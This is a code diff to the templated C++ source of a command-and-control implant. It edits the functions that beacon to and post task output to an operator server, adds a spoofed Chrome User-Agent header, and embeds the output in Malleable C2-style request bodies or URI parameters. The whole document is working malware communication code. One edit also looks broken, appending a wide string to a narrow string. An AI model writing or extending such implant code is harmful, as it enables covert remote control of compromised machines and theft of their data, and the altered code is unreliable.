@@ -45,6 +45,7 @@ nlohmann::json get(std::string implant_uuid) {
     std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
 
     //setup default header, which at minumum contains the useragent
+    //!! NOTE: Placeholder value, mc2 does not apply here yet
     std::vector<std::wstring> headers = {
             L"User-Agent: GoogleChrome", 
     };
@@ -156,8 +157,12 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     // convert to w strings because winapi wants that
     std::wstring w_payload(payload.begin(), payload.end());
     std::wstring w_id(implant_uuid.begin(), implant_uuid.end());
-    
-    std::vector<std::wstring> headers;
+
+    //setup default header, which at minumum contains the useragent
+    //!! NOTE: Placeholder value, mc2 does not apply here yet
+    std::vector<std::wstring> headers = {
+            L"User-Agent: GoogleChrome", 
+    };
     std::wstring uri = L"[[ http_post_uri ]]";
     std::string final_post_body = ""; 
 
@@ -193,12 +198,12 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     [%- endif %]
 
     [%- if http_post_client_output_terminator == "print" %]
-        final_post_body += payload;
+        final_post_body += w_payload;
     [%- endif %]
-    
+
     [%- if http_post_client_output_terminator == "parameter" %]
         // This is dangerous for large output, but Malleable C2 allows it
-        std::wstring w_body_param(payload.begin(), payload.end());
+        std::wstring w_body_param(w_payload.begin(), w_payload.end());
         if (uri.find(L"?") != std::wstring::npos) uri += L"&"; else uri += L"?";
         uri += L"[[ http_post_client_output_terminator_value ]]=" + w_body_param;
     [%- endif %]
